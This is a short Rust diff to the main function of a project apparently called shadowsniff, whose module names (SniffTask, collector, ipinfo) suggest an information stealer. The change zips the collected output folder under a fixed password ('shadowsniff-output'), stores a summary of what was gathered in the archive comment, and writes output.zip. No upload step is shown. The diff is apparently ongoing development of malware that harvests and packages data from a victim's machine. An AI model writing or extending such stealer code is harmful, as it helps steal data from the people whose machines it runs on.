@@ -15,6 +15,7 @@
 
 extern crate alloc;
 
+use alloc::format;
 use collector::atomic::AtomicCollector;
 use collector::DisplayCollector;
 use ipinfo::init_ip_info;
@@ -22,6 +23,7 @@ use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 use utils::path::Path;
+use zip::ZipArchive;
 
 mod panic;
 
@@ -45,7 +47,18 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
         SniffTask::default().run(&out, &collector);
     }
     
-    log_debug!("{}", DisplayCollector(collector));
+    let displayed_collector = format!("{}", DisplayCollector(collector));
+
+    log_debug!("{displayed_collector}");
+
+    let zip = ZipArchive::default()
+        .add_folder_content(&out)
+        .password("shadowsniff-output")
+        .comment(displayed_collector)
+        .create();
+
+    let out = Path::new("output.zip");
+    let _ = out.write_file(&zip);
 
     0
 }
